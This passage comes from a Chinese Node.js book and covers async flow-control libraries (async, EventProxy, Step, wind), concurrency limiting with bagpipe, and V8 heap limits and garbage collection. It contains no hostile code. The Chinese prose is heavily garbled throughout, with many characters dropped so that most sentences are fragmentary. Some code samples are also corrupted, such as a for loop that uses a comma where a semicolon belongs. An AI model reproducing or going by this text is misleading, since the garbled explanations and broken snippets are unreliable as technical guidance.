样，过async编写的没有深的，也没有复杂的，它的自于入的数。parallel()对于的是一个用产生了，就会作为一个数入最的数。只有有用都时，才会以数组的入。也你还EventProxy的，下
var EventProxy = require('eventproxy'); 
var proxy = new EventProxy(); proxy.all('content', 'data', function (content, data) { 
callback(null, [content, data]); }) proxy.fail(callback); 
fs.readFile('file1.txt', 'utf-8', proxy.done('content')); fs.readFile('file2.txt', 'utf-8', proxy.done('data')); 
与过async编写产生的量相并不大。EventProxy于事发/阅，也用到了与async相的，过的数的。不的是，在async的下，这个数由async后，EventProxy过done()fail()4生新的数。这实都是高数的应用。
的
series()的，前一个的是后一个用的入时，series()就了。，这场景的，async了waterfall()，相关下
async.waterfall([ function (callback) {  fs.readFile('file1.txt', 'utf-8', function (err, content) { callback(err, content);
 }); }, function (arg1, callback) {
 // arg1 => file2.txt  fs.readFile(arg1, 'utf-8', function (err, content) { callback(err, content);
 }); }, function(arg1, callback){ 
 // arg1 => file3.txt  fs.readFile(arg1, 'utf-8', function (err, content) { callback(err, content); }); } ], function (err, result) { // result => file4.txt });
这于下
fs.readFile('file1.txt', 'utf-8', function (err, data1) { if (err) { 
 return callback(err); } fs.readFile(data1, 'utf-8', function (err, data2) { 
 if (err) { 
return callback(err); }  fs.readFile(data2, 'utf-8', function (err, data3) { 
if (err) { 
return callback(err); } callback(null, data3); 
 }); }); }); 
. 
在实的务环境中，有很多复杂的关系，这些务是，是。这杂的编程环境经人于不序的情。为，async了一个强大的auto()实复杂务。
我们的务场景下
(1) 从读。
(2) 接MongoDB。
(3) 接Redis。
(4) 编。
(5) 上到CDN。
(6) 动服务。一下上务

{ readConfig: function () {}, connectMongoDB: function () {}, connectRedis: function () {}, complieAsserts: function () {}, uploadAsserts: function () {}, startup: function () {} 
} 
接下分一下关系。可以，connectMongoDB connectRedis readConfig，uploadAssertscomplieAsserts，startup有。关系下
var deps = { 
readConfig: function (callback) {  // read config file  callback(); 
}, 
connectMongoDB: ['readConfig', function (callback) {  // connect to mongodb  callback(); 
}], 
connectRedis: ['readConfig', function (callback) {  // connect to redis  callback();
}], 
complieAsserts: function (callback) {  // complie asserts  callback(); 
}, 
uploadAsserts: ['complieAsserts', function (callback) {  // upload to assert  callback(); 
}], startup: ['connectMongoDB', 'connectRedis', 'uploadAsserts', function (callback) {  // startup }] }; 
auto()能关系自动分，以最的序以上务
async.auto(deps); 
到EventProxy的实，要的事分，相关下
proxy.assp('readtheconfig', function () { // read config file proxy.emit('readConfig'); 
}).on('readConfig', function () { // connect to mongodb proxy.emit('connectMongoDB'); 
}).on('readConfig', function () { // connect to redis proxy.emit('connectRedis'); 
}).assp('complietheasserts', function () { // complie asserts proxy.emit('complieAsserts'); 
}).on('complieAsserts', function () { // upload to assert proxy.emit('uploadAsserts'); 
}).all('connectMongoDB', 'connectRedis', 'uploadAsserts', function () { // Startup }); 
. 
本要async的几用。外，async还了forEach、mapECMAScript5中数组的，多可关https://github.com/caolan/async。
3. Step 
一个的程是TimCaswell的Step，它async量，在API的上也一性，因为它只有一个接Step。过npm install step可使用。下
Step(task1, task2, task3); 
Step接数量的务，有的务都会次。下的次读
Step( function readFile1() {  fs.readFile('file1.txt', 'utf-8', this); }, 
function readFile2(err, content) { 
 fs.readFile('file2.txt', 'utf-8', this); }, function done(err, content) { 
 console.log(content); } ); 
可以到，Step与前的事、Promise甚至async都不的一在于Step用到了this关。事实上，它是Step内部的一个next()，用的下一个务作为数，并用。
. 
，Step实多个务并this有一个parallel()，它Step，要有务时才下一个务，相关下
Step( 
function readFile1() {  fs.readFile('file1.txt', 'utf-8', this.parallel());  fs.readFile('file2.txt', 'utf-8', this.parallel()); 
}, 
function done(err, content1, content2) {  // content1 => file1  // content2 => file2  console.log(arguments); 
} ); 
使用parallel()的时候要小心的是，的的是多个数，Step只会前个数，相关下
var asyncCall = function (callback) { process.nextTick(function () {  callback(null, 'result1', 'result2'); }); }; 
在用parallel()时，result2会。
Step的parallel()的是次时内部的数加1，后一个数，这个数在用时才。数时，数1。数为0的时候，Step有用了，Step会下一个。
Step与async相的是，一有一个产生，这个会作为下一个的一个数入。
. 
Step的外一个是group()，它于parallel()的，是在上有不。下的用于读一个目，后中的作
Step( function readDir() { 
 fs.readdir(__dirname, this); }, function readFiles(err, results) { 
 if (err) throw err;  // Create a new group  var group = this.group(); results.forEach(function (filename) { 
if (/\.js$/.test(filename)) { fs.readFile(__dirname + "/" + filename, 'utf8', group()); } 
 }); }, function showAll(err, files) { 
 if (err) throw err;  console.dir(files); } 
); 4我们到有次group()的用。一次用是Step要并，次用的会生一个数，数接的会组。parallel()下一个务的是下
function (err, result1, result2, ...); 
group()的是
function (err, results); 
这个数的数在数组中。
4. wind 
这还要一不的编程wind（https://github.com/JeffreyZhao/wind）。它的前为Jscex，由国内开发。它为JavaScript语言了一个monadic，能高一些场景下的编程。
编程有时要的场景，下我们由一个序了解wind的之
var compare = function (x, y) { return x - y; }; 
var swap = function (a, i, j) { var t = a[i]; a[i] = a[j]; a[j] = t; }; 
var bubbleSort = function (array) { for (var i = 0; i < array.length; i++) {  for (var j = 0; j < array.length -i - 1; j++) { if (compare(array[j], array[j + 1]) > 0) { swap(array, j, j + 1); } } } }; 
在我们要加的是，这个序动起。这着在swap()中要加动
，这在JavaScript中并不是一事，的在于动要时的。在JavaScript中只有setTimeout()能实时能（用while时的不可，这在前有）。我们，setTimeout()是一个，在后，立。以，在
动时序的序的继续会动多动。因，的动以实，wind在解决这个问题上了它的之，相
关下
var compare = function (x, y) { return x - y; }; 
var swapAsync = eval(Wind.compile("async", function (a, i, j) { $await(Wind.Async.sleep(20)); // 20var t = a[i]; a[i] = a[j]; a[j] = t; paint(a); //重数组
})); 
var bubbleSort = eval(Wind.compile("async", function (array) { for (var i = 0; i < array.length; i++) {  for (var j = 0; j < array.length -i - 1; j++) { if (compare(array[j], array[j + 1]) > 0) { $await(swapAsync(array, j, j + 1)); } } } })); 
上实了20、动、继续序的。从的，这-入了，是并没有他程样，并没有因为分。时可以到，我们的中入了一些新的
. eval(Wind.compile("async", function() {})); 
. $await(); . Wind.Async.sleep(20);

下我们以上3的之。
定
eval()数在一是一个要对的数，Douglas Crockford是深绝为，因为它能问上下编，可能上下。大多数用eval()数的人都不能好它的用，DouglasCrockford认为它是JavaScript可有可的能。
是在wind的，好反Douglas Crockford之之，用了eval()问上下
的性。Wind.compile()会的数编，后eval()。言之，eval(Wind.compile("async", function () {}));定了务。Wind.Async.sleep();内了对setTimeout()的。
. $await()在定后，wind了$await()实。事实上，它并不是一个，也不在于上下中，只是一个的，之编这要。
$await()接的数是一个务对，务后才会后续作。一个作都可以为一个务，wind是于务实的。下的用于fs.readFile()用为一个务
var Wind = require("wind"); var Task = Wind.Async.Task; 
var readFileAsync = function (file, encoding) { return Task.create(function (t) {  fs.readFile(file, encoding, function (err, file) { if (err) { t.complete("failure", err); } else { t.complete("success", file); }  }); }); }; 
了过eval(Wind.compile("async", function () {}));定务外，的务创为Task.create()。readFileAsync()数到的务。在时，可以过complete()failuresuccess信，务。是failure可以过try/catch。这有些前try/catch数中的定。下的为用readFileAsync()到一个务的
var task = readFileAsync('file1.txt', 'utf-8'); 
下我们async者Step的一样，试一下wind的
var serial = eval(Wind.compile("async", function () { var file1 = $await(readFileAsync('file1.txt', 'utf-8')); console.log(file1); var file2 = $await(readFileAsync('file2.txt', 'utf-8')); console.log(file2); try { 
 var file3 = $await(readFileAsync('file3.txt', 'utf-8')); } catch (err) {  console.log(err); } })); 
serial().start(); 
上，到下
file1 
file2 { [Error: ENOENT, open 'file3.txt'] errno: 34, code: 'ENOENT', path: 'file3.txt' } 
在JavaScript中会立，在wind中做到了不CPU的目的。接下我们试下并的，相关下
var parallel = eval(Wind.compile("async", function () { 
var result = $await(Task.whenAll({  file1: readFileAsync('file1.txt', 'utf-8'),  file2: readFileAsync('file2.txt', 'utf-8') 
})); console.log(result.file1); console.log(result.file2); 
})); 
parallel().start(); 
到
file1 file2 
wind了whenAll()并发，过$await关的有务后才下继续。
换数
可以到，了eval(Wind.compile("async", function () {}))在实中外，用在上已经与用相几。这分从已有的用编写的Node，可以写的开。
Promise/Deferred可以编程，这编程的要我们外者前的事情是务。这务的过程可以作是Promise/Deferred的。个都readFileAsync一定，会是一个大的工作量。wind了个
. Wind.Async.Binding.fromCallback 
. Wind.Async.Binding.fromStandard 

在Node中的有，一是的用，只有一个数，下
fs.exists("/etc/passwd", function (exists) { // exists数表是否存在}); 
fromCallback用于这用为wind中的务。一是的用，数的一个数作为，下
fs.readFile('file1.txt', function (err, data) { // err表异常}); 
fromStandard用于这用到wind中的务。是，readFileAsync的定实只要一可实
var readFileAsync = Wind.Async.Binding.fromStandard(fs.readFile); 
5. 
从本书的个程，从解决到解决作的有多，几个几。编程相对复杂，并事，相的问题过技能复杂的事情。
这对下几的区事发/阅相对是一为始的，Promise/Deferred贡献了一个不的务的。上的这些程与Promise/Deferred的不，Promise/Deferred的在于的用部分，程没有，在数的入上。从自由上，async、Step这要相对灵活多。EventProxy要事发/阅程过高数生数的实。
了async、Step、EventProxy、wind外，还有一过源编的实程的，streamline是的。这并不在本的内，读者有，可以自阅相关。
4.4
在续的编程，解决的问题外的性能优势，编程，是这有一个过不的。
在Node中，我们可以分用发起并用。使用下的，我们可以发起100次用
for (var i = 0, i < 100; i++){ 
async(); 
} 
是并发量过大，我们的下服务会不。是对系统大量并发用，作系统的数量会用，下
Error: EMFILE, too many open files 
可以，I/O与I/O的I/O因为个I/O都是的，在环中，是一个接着一个用，不会用多的情，时性能也是下的对于I/O，并发实，是由于实，要。言之，管是要系统的性能，还是要一定的过，以过不。
4.4.1bagpipe
对有的API加过，我们的不是动API。实我写的bagpipe的解决是这样的。
过一个并发量。
前活跃（用发起）的用量小于定，从中。
活跃用到定，用时在中。个用时，从中新的用。bagpipe的API要了一个push()full事，下

var Bagpipe = require('bagpipe'); //设定发数为10 var bagpipe = new Bagpipe(10); for (var i = 0; i < 100; i++){ 
bagpipe.push(async, function () {  //异步回调执行
}); } bagpipe.on('full', function (length) { 
console.warn('系统处理不能时成队列目前队列长为:' + length); }); 
这的实于前的smooth()。push()是过数的实，
一个数是，最后一个数是数，余为他数，心实下
/** 
*入方法数数为回调函数
 * 
@param {Function} method异步方法

 * 
@param {Mix} args数列表数为回调函数 */ 


Bagpipe.prototype.push = function (method) { var args = [].slice.call(arguments, 1); var callback = args[args.length -1]; if (typeof callback !== 'function') { 
 args.push(function () {}); } if (this.options.disabled || this.limit < 1) { 
 method.apply(null, args); return this; } 
// 队列长过限制时if (this.queue.length < this.queueLength || !this.options.refuse) { 
 this.queue.push({ method: method, args: args 
 }); 
} else {  var err = new Error('Too much async call in queue');  err.name = 'TooMuchAsyncCallError';  callback(err); 
} 
if (this.queue.length > 1) { this.emit('full', this.queue.length); } 
this.next(); return this; }; 
用推入后，用一次next()试触发。next()的定下
/*! *续执行队列中的续动作 */ 
Bagpipe.prototype.next = function () { var that = this; if (that.active < that.limit && that.queue.length) { 
 var req = that.queue.shift();  that.run(req.method, req.args); } }; 
next()要活跃用的数量，，用内部run()的用。4 这为了数是否，用了一个入的技，下
/*! *执行队列中的方法 */ 
Bagpipe.prototype.run = function (method, args) { var that = this; that.active++; var callback = args[args.length -1]; var timer = null; var called = false; 
// inject logic 
args[args.length -1] = function (err) {  // anyway, clear the timer if (timer) { 
clearTimeout(timer); 
timer = null; }  // if timeout, don't execute  if (!called) { 
that._next(); callback.apply(null, arguments); 
 } else { // pass the outdated error if (err) { 
that.emit('outdated', err); } } }; 
var timeout = that.options.timeout; if (timeout) {  timer = setTimeout(function () { // set called as true 
called = true; 
that._next(); 
// pass the exception 
var err = new Error(timeout + 'ms timeout'); 
err.name = 'BagpipeTimeoutError'; 
err.data = { 
name: method.name, 
method: method.toString(), 
args: args.slice(0, -1) 
}; 
callback(err); 
 }, timeout); 
} 
method.apply(null, args); 
}; 
用入的数前，过。这个的数内部的活跃的数1后，动用next()后续的用。
bagpipe于开了一，用并，是定上。仅仅在用push()时分开，并不对有API有入。
式
事实上，bagpipe还有一些深的使用。对于大量的用，也要分场景区分，因为并发，会部分用要。用有实时的，要，因为到时，可能已经过了时，使了数，也没有了。这场景下要，用，不用不要的时。bagpipe为了绝。
绝的使用只要下数可，相关下
//设定发数为10 
var bagpipe = new Bagpipe(10, { 
refuse: true 
}); 
在绝下，的用也了之后，新的用就接它一个的绝。
. 
的要因是用时，用产生的高于的。为了些用使用了多的时，我们要一个时线，些时的用活跃，中的用。否在绝下，会有多的用因为个，到绝。相对言，这场景下到绝。为了对在实时场景下的个用，要个用的时，些之。
为，bagpipe也了时。时是为用一个时，用没有在定时内，我们用入的数，用到一个时，以。后下一个中的用。时的下
//设定发数为10 var bagpipe = new Bagpipe(10, { timeout: 3000 }); 
. 
用的并发在不场景下的不实时场景下，的并发时已经可以在实时场景下，要、的。
4.4.2async
有，async也了一个用于用的parallelLimit()。下是async的
async.parallelLimit([ function (callback) { 
 fs.readFile('file1.txt', 'utf-8', callback); }, function (callback) { 
 fs.readFile('file2.txt', 'utf-8', callback); } ], 1, function (err, results) { // TODO }); 
parallelLimit()与parallel()，多了一个用于并发数量的数，使务只能时并发一定数量，不是并发。parallelLimit()的在于动加并务。为，async了queue()，这对于遍目作分有。以下是queue()的
var q = async.queue(function (file, callback) { 
fs.readFile(file, 'utf-8', callback); }, 2); q.drain = function () { 
// 成队列中的有务}; fs.readdirSync('.').forEach(function (file) { 
q.push(file, function (err, data) {  // TODO }); }); 
管queue()实了动加并务，是相parallelLimit()，由于queue()接收的数是定的，它了parallelLimit()的多样性，我心认为bagpipe灵活，可以加的务，也可以动加务，时还能在实时场景中加入绝时
。在实应用中，开发者可以场景。
4.5
在接触Node的过程中，很多人接触了几个数之后就了。管编程，是并一是，一习，就自。从社区过的经言，JavaScript编程的题已经本解决，是过事，还是过Promise/Deferred，者程。相信在以上技之后，编程不是事，习编程之后，会收多享的编程。
本要了的几编程解决，这是目前JavaScript中要使用的。对于他语言言，还有程（coroutine）。是由于Node于V8的因，在目前EMCAScript5的实下还不程。这些还在定中，以时不作。的V8Generator，也在Node中能接使用。
最后，因为人们是习性以线性的，以编程相对为以。这个以的本质是不会因为大线性的性。就像月不会因为你的心情自有的。
4.6
本的源下
. http://nodejs.org/docs/latest/api/events.html 
. https://github.com/JacksonTian/eventproxy/blob/master/README.md 
. https://github.com/JeffreyZhao/jscex/blob/master/README-cn.md 
. http://documentup.com/kriskowal/q/ 
. http://gearman.org/ 
. https://github.com/JacksonTian/bagpipe 
. http://www.jslint.com/lint.html 
. https://github.com/JeffreyZhao/wind 
. http://wiki.commonjs.org/wiki/Promises

 
第章 



也读者会好为会有这样一在于本书中，因为在过很一时内，JavaScript开发者很在开发过程中到要对内的场景，也的。到内，大想起的也只是本的IE中JavaScript与DOM时发生的问题。页的内用过多，本不到收，用已经不新了前页。
着Node的发，JavaScript已经实了CommonJS的生大一统的想，JavaScript的应用场景已不在中。本时开些时的场景，网页应用、工，这场景由于时，且在用的机上，使内使用过多内，也只会到端用。由于时，着程的，内会，几没有内管的要。着Node在服务端的广应用，他语言在着的问题在JavaScript中也了。
于、事驱动立的Node服务，有内的优，海量的网请。在海量请的前下，开发者就要一些不会的问题。本书写到这是服务端编程的了，内是在海量请时的前下探的。在服务端，源就，要为海量用服务，就使一源都要高环用。在3中，不多已Node是用CPUI/O这个服务源，本在Node中高使用内。
5.1V8 
我们在学习JavaScript编程时过，它与Java一样，由收机自动内管，这使开发者不要像C/C++程序样在编写的过程中时关内的分问题。在中开发时，几很有人能到收对应用程序性能的情。Node极大了JavaScript的应用场景，应用场景从客端到服务端之后，我们就能发，对于性能的服务端程序，内管的好、收是否优，都会对服务。在Node中，这一都与Node的JavaScriptV8相关。
5.1.1Node V8 
可以发，Node在发程中不开V8，以在的页中就到Node是一个在Chrome的JavaScript时上的。2009年，Node的创始人Ryan Dahl了V8作为Node的JavaScript脚本，这不开时起的次大。次大中，自Google的Chrome以优的性能为。Chrome的后不开JavaScriptV8。V8后，JavaScript一它作为脚本语言性能下的。在接下的性能分中，V8续至今。V8的性能优势使用JavaScript写高性能后服务程序为可能。在这样的机下，Ryan Dahl了JavaScript，了V8，在事驱动、I/O的下实了Node。
关于V8，它的与景是大有。作为机，V8的性能优，这与它的-者有大的源，Chrome的也不开它后的天才——LarsBak。在Lars的工作，绝大部分都是与机相关的工作。在开发V8之前，他经在Sun工作，HotSpot的技术，要于开发高性能的Java机。在这之前，他也为Self、Smalltalk语言开发过高性能机。这些与的经V8一就了时有的JavaScript机。
Node在JavaScript的上接于V8，可以着V8的就能享到好的性能新的语言性（ES5ES6），时也到V8的一些，是本要的内。
5.1.2V8 
在一的后端开发语言中，在本的内使用上没有，在Node中过JavaScript使用内时就会发只能使用部分内（64系统下为1.4GB，32系统下为0.7 GB）。在这样的下，会Node接作大内对，一个2 GB的读入内中分，使内有32GB。这样在个Node程的情下，机的内源到的使用。
这个问题的要因在于Node于V8，以在Node中使用的JavaScript对本上都是过V8自己的分管的。V8的这内管机在的应用场景下使用起有余，以前端页中的有。在Node中，这了开发者心使用大内的想。
管在服务端作大内也不是的场景，有了之后，我们的为就着，在实的应用中不小心触到这个，会程。要V8为
了内的用量，要到V8在内使用上的。后，才能问题并好内管。
5.1.3V8 
在V8中，有的JavaScript对都是过分的。Node了V8中内使用量的，下的，到的内信
$ node > process.memoryUsage(); { rss: 14958592, 
heapTotal: 7195904, heapUsed: 2821496 } 
在上中，在memoryUsage()的3个性中，heapTotalheapUsed是V8的内使用情，前者是已请到的内，后者是前使用的量。至于rss为，我们在后续的内中会到。图5-1为V8的图

图5-1 V8的图
我们在中量并时，使用对的内就分在中。已请的内不分新的对，继续请内，到的大小过V8的为。
至于V8为要的大小，因为V8最初为，不可能到用大量内的场景。对于网页，V8的已经有余。深因是V8的收机的。的，以1.5GB的收内为，V8做一次小的收要50以上，做一次量的收甚至要1以上。这是收中起JavaScript线程的时，在这样的时下，应用的性能应能都会线下。这样的情不仅仅后端服务接，前端也接。因，在时的下接内是一个好的。
，这个也不是不能开，V8了我们使用多的内。Node在动时可以--max-old-space-size--max-new-space-size内的大小，下
node --max-old-space-size=1700 test.js //单位为MB //者node --max-new-space-size=1024 test.js //单位为KB
上数在V8初始时生，一生就不能动。到Node分内JavaScript对的情，可以用这个办V8认的内，在过程中多用了一些内就。
接下，我们深入了解V8在收的。在的前下，着的并不一定就。
5.1.4V8 
在开V8的收机前，有要下V8用到的收。
1. V8
V8的收要于分收机。在自动收的过程中，人们发没有一收能有的场景。因为在实的应用中，对的生不一，不的只能对定情有最好的。为，统学在收的发中产生了大的作用，的收中对的活时内的收不的分，后分对不分的内以高的。
. V8的
在V8中，要内分为新生生。新生中的对为活时的对，生中的对为活时内的对。图5-2为V8的分图。

图5-2 V8的分图
V8的大小就是新生用内加上生的内。前我们的--max-old-space-size数可以用于生内的最大，--max-new-space-size数用于新生内的大小的。的是，这个最大要在动时就定。这着V8使用的内没有办使用情自动，内分过程中过极时，就会起程。
前到过，在认下，一分内，在64系统32系统下会分只能使用1.4GB0.7 GB的大小。这个可以从V8的源中到。在下的中，Page::kPageSize的为1MB。可以到，生的在64系统下为1400 MB，在32系统下为700 MB
// semispace_size_ should be a power of 2 and old_generation_size_ should be // a multiple of Page::kPageSize #if defined(V8_TARGET_ARCH_X64) #define LUMP_OF_MEMORY (2 * MB) 
code_range_size_(512*MB), #else #define LUMP_OF_MEMORY MB 
code_range_size_(0), #endif #if defined(ANDROID) 
reserved_semispace_size_(4 * Max(LUMP_OF_MEMORY, Page::kPageSize)), max_semispace_size_(4 * Max(LUMP_OF_MEMORY, Page::kPageSize)), initial_semispace_size_(Page::kPageSize), max_old_generation_size_(192*MB), max_executable_size_(max_old_generation_size_), 
#else reserved_semispace_size_(8 * Max(LUMP_OF_MEMORY, Page::kPageSize)), max_semispace_size_(8 * Max(LUMP_OF_MEMORY, Page::kPageSize)), initial_semispace_size_(Page::kPageSize), max_old_generation_size_(700ul * LUMP_OF_MEMORY), max_executable_size_(256l * LUMP_OF_MEMORY), 
#endif 
对于新生内，它由个reserved_semispace_size_，后因。机
数不，reserved_semispace_size_在64系统32系统上分为16 MB8 MB。以新生
内的最大在64系统32系统上分为32 MB16 MB。
V8内的最大可以从下的中，为4 * reserved_semispace_ size_ + max_old_generation_size_ 
// Returns the maximum amount of memory reserved for the heap. For 
// the young generation, we reserve 4 times the amount needed for a 
// semi space. The young generation consists of two semi spaces and 
// we reserve twice the amount needed for those in order to ensure 
// that new space can be aligned to its size 
intptr_t MaxReserved() { 
 return 4 * reserved_semispace_size_ + max_old_generation_size_; 
} 
因，认情下，V8内的最大在64系统上为1464 MB，32系统上为732 MB。这个数可以解为在64系统下只能使用1.4 GB内在32系统下只能使用0.7 GB内。
. Scavenge在分的上，新生中的对要过Scavenge收。在Scavenge的实中，要用了Cheney，由C.J.Cheney于1970年次发在ACM上。
Cheney是一用复的实的收。它内一分为，一部分为semispace。在这个semispace中，只有一个于使用中，一个于。于使用的semispace为From，于的为To。我们分对时，是在From中分。开始收时，会From中的活对，这些活对复到To中，活对用的会。复后，FromTo的发生对。言之，在收的过程中，就是过活对在个semispace之复。
Scavenge的是只能使用内中的一，这是由分复机决定的。Scavenge由于只复活的对，并且对于生的场景活对只部分，以它在时上有优的。
由于Scavenge是的时的，以大应用到有的收中。可以发，Scavenge应用在新生中，因为新生中对的生，这个。
是，V8的内图应图5-3。

图5-3 V8的内图
实使用的内是新生中的个semispace大小生用内大小之。一个对经过多次复活时，它会认为是生的对。这生的对后会动到生中，用新的管。对从新生中动到生中的过程为。
在的Scavenge过程中，From中的活对会复到To中，后对FromTo对（）。在分收的前下，From中的活对在复到To之前要。在一定下，要活的对动到生中，也就是对。
对的要有个，一个是对是否经过Scavenge收，一个是To的内用过。
在认情下，V8的对分要中在From中。对从From中复到To时，会它的内这个对是否已经经过一次Scavenge收。已经经过了，会对从From复到生中，没有，复到To中。这个程图5-4。

图5-4程
一个是To的内用。要从From复一个对到To时，To已经使用了过25%，这个对接到生中，这个的图图5-5。

图5-5的图
25%这个的因是这次Scavenge收后，这个ToFrom，接下的内分在这个中。过高，会后续的内分。
对后，会在生中作为活的对对，接新的收。
. Mark-Sweep &Mark-Compact
对于生中的对，由于活对大，用Scavenge的会有个问题一个是活对多，复活对的会很一个问题是一的问题。这个问题应对生的对时Scavenge会。为，V8在生中要用了Mark-SweepMark-Compact相的收。
Mark-Sweep是的，它分为个。与Scavenge相，Mark-Sweep并不内分为，以不在一的为。与Scavenge复活着的对不，Mark-Sweep在遍中的有对，并活着的对，在后的中，只没有的对。可以，Scavenge中只复活着的对，Mark-Sweep只对。活对在新生中只小部分，对在生中只小部分，这是收能高的因。图5-6为Mark-Sweep在生中后的图，部分为的对。

图5-6 Mark-Sweep在生中后的图 
Mark-Sweep最大的问题是在一次收后，内会不续的。这内会对后续的内分问题，因为很可能要分一个大对的情，这时有的都次分，就会前触发收，这次收是不要的。
为了解决Mark-Sweep的内问题，Mark-Compact。Mark-Compact是的，是在Mark-Sweep的上的。它们的在于对在为后，在的过程中，活着的对一端动，动后，接外的内。图5-7为Mark-Compact并动活对后的图，为活对，深为对，为活对动后下的。

图5-7 Mark-Compact并动活对后的图
动后，就可以接最的活对后的内区收。
这Mark-SweepMark-Compact着不仅仅是因为是关系，在V8的收中者是使用的。5-1是目前到的3要收的对。
5-13
 Mark-Sweep  Mark-Compact  Scavenge  
 中 最 最 
开 （有） （） （） 
是否动对 否 是 是 

从5-1中可以到，在Mark-SweepMark-Compact之，由于Mark-Compact要动对，以它的不可能很，以在上，V8要使用Mark-Sweep，在不以对从新生中过的对分时才使用Mark-Compact。
. Incremental Marking 
为了JavaScript应用与收到的不一的情，收的3本都要应用下，收后复应用，这为为（stop-the-world）。在V8的分收中，一次小收只收新生，由于新生认小，且中活对，以它是的也不大。V8的生大，且活对多，收（full 收）的、、动作的就会可，要。
为了收的时，V8从入，本要一的动作为量（incrementalmarking），也就是分为多小，做一就JavaScript应用一小会，收与应用到。图5-8为量图。

图5-8量图
V8在经过量的后，收的最大时可以到本的1/6。
V8后续还入了（lazy sweeping）与量（incremental compaction），与动作也量的。时还入并与并，一用多性能次的时。于有，不深入解了。
2. 
从V8的自动收机的可以到，V8对内使用的由。新生为一个小的内是的，生过大对于收并。V8对内的对于Chrome这个页使用一个V8实言，内的使用是有余了。对于Node编写的服务端，内也并不场景下的使用。是对于V8的收JavaScript在线程上的情，收是性能的因之一。想要高性能的，要收量，是收。
以Web服务中的会实为，一过内，在问量大的时候会生中的活对，不仅/过程时，还会内，甚至（情可8）。
5.1.5
收的要是在动时加--trace_gc数。在收时，会从
中收的信。下是一，后，会在gc.log中到有收信
node --trace_gc -e "var a = [];for (var i = 0; i < 1000000; i++) a.push(new Array(100));" > gc.log 
下是我的收中的部分要内
[2489] 19 ms: Scavenge 1.9 (34.0) -> 1.8 (35.0) MB, 1 ms [Runtime::PerformGC]. ... [2489] 36 ms:Mark-sweep9.1(40.0) ->9.0(44.0)MB,10 ms[Runtime::PerformGC][promotionlimit reached]. ... [2489] Limited new space size due to high promotion rate: 1 MB ... [2489] Increasing marking speed to 3 due to high promotion rate ... [2489]  107 ms: Mark-sweep 38.4 (73.0) -> 38.0 (74.0) MB, 3 ms (+ 23 ms in 63 steps since start of marking, biggest step 0.284180 ms) [Runtime::PerformGC] [promotion limit reached]. ... [2489] 188 ms: Mark-sweep 63.8 (100.0) -> 63.4 (100.0) MB, 45 ms [Runtime::PerformGC] [GC in old space requested]. ... [2489] 395 ms: Scavenge 182.9 (220.3) -> 182.9(221.3)MB,1 ms(+2ms in7stepssince last GC) [Runtime::PerformGC] [incremental marking delaying mark-sweep]. ... 
过分收，可以了解收的，收的些时，触发的因是。
过在Node动时使用--prof数，可以到V8时的性能分数，中包了收时用的时。下的不创对并分部量a，这以下为test01.js 
for (var i = 0; i < 1000000; i++) { var a = {}; } 
后以下
$ node --prof test01.js 
这会在目下到一个v8.log。本不可读性，内大下
code-creation,LazyCompile,0x1dd61958ec00,396," /Users/jacksontian/git/diveintonode/examples/05/test01.js:1",0x38c53b008370,~ tick,0x10031daaa,0x7fff5fbfe4c0,0,0x34bb,2,0x1dd61958eb3e,0x1dd6195688bf,0x1dd6195689e5,0x1dd61956 7599,0x1dd619566efc,0x1dd619568e4b,0x1dd61952e78a code-creation,LazyCompile,0x1dd61958eda0,532," /Users/jacksontian/git/diveintonode/examples/05/test01.js:1",0x38c53b008370,* tick,0x1dd61958eecd,0x7fff5fbff3b8,0,0x16e3f,0,0x1dd6195688bf,0x1dd6195689e5,0x1dd619567599,0x1dd6 19566efc,0x1dd619568e4b,0x1dd61952e78a tick,0x1dd61958ee55,0x7fff5fbff3b8,0,0x5082a,0,0x1dd6195688bf,0x1dd6195689e5,0x1dd619567599,0x1dd6 19566efc,0x1dd619568e4b,0x1dd61952e78a tick,0x1dd61958ee77,0x7fff5fbff3b8,0,0x8c593,0,0x1dd6195688bf,0x1dd6195689e5,0x1dd619567599,0x1dd6 19566efc,0x1dd619568e4b,0x1dd61952e78a tick,0x1dd61958ee71,0x7fff5fbff3b8,0,0xc8717,0,0x1dd6195688bf,0x1dd6195689e5,0x1dd619567599,0x1dd6 19566efc,0x1dd619568e4b,0x1dd61952e78a code-creation,StoreIC,0x1dd61958efc0,185,"loaded" 
，V8了linux-tick-processor工用于统信。工可以从Node源的
deps/v8/tools目下到，Windows下的对应为windows-tick-processor.bat。目
加到环境量PATH中，可接用
$ linux-tick-processor v8.log
下为我次的统
Statistical profiling result from v8.log, (37 ticks, 1 unaccounted, 0 excluded). 
 [Unknown]: ticks total nonlib name 1 2.7%
 [Shared libraries]: ticks total nonlib name 
28  75.7%  0.0%  /usr/local/bin/node 2 5.4%  0.0%  /usr/lib/system/libsystem_kernel.dylib 2 5.4%  0.0 % /usr/lib/system/libsystem_c.dylib
 [JavaScript]: ticks total nonlib name 
3 8.1 % 60.0%  LazyCompile: *<anonymous> /Users/jacksontian/git/diveintonode/examples/05/test01.js:1 
1 2.7 % 20.0%  Stub: FastCloneShallowObjectStub 1 2.7 % 20.0% Function: ~NativeModule.compile node.js:613 
 [C++]: ticks total nonlib name
 [GC]: ticks total nonlib name 2 5.4%
 [Bottom up (heavy) profile]: Note: percentage shows a share of a particular caller in the total amount of its parent calls. Callers occupying less than 2.0 % are not shown. 
ticks parent name 28  75.7 % /usr/local/bin/node ... 
统内多，中收部分下
 [GC]: ticks total nonlib name 2 5.4%
由于不分对，收的时为5.4%。，这着事环1000的过程中要54的时用于收。
5.2
在V8前，开发者要的是收机高工作。
5.2.1
到触发收，一个要的是作用（scope）。在JavaScript中能作用的有数用、with以作用。以下为
var foo = function () { var local = {}; }; 
foo()数在次用时会创对应的作用，数后，作用会。时作用中的部量分在作用上，作用的。只部量用的对活。在这个中，由于对小，会分在新生中的From中。在作用后，部量local，用的对会在下次收时。
以上就是最本的内收过程。
1. 
与作用相关的是识。识，可以解为量。在下的中，
bar()数时，会到local量
var bar = function () { console.log(local); }; 
JavaScript在时会量定在。它最的是前作用，在前作用中到量的，会上的作用，到到为。
2. 
在下的中
var foo = function () { var local = 'local var'; var bar = function () { 
 var local = 'another var'; var baz = function () { 
console.log(local);  };  baz(); 
}; 
bar(); }; foo(); 
local量在baz()数的作用不到，继在bar()的作用。上bar()中的local，会继续上，一到作用。这样的使作用像一个。由于识的是上的，以量只能外问，不能内问。图5-9为量在作用中的图。

图5-9量在作用中的图
我们在baz()数中问local量时，由于作用中的量中没有local，以会上一个作用中，接着会在bar()数到的量中到了一个local量的定，于是使用它。管在上一的作用中也在local的定，是不会继续了。一个不在的量，会一着作用到作用，最后定。
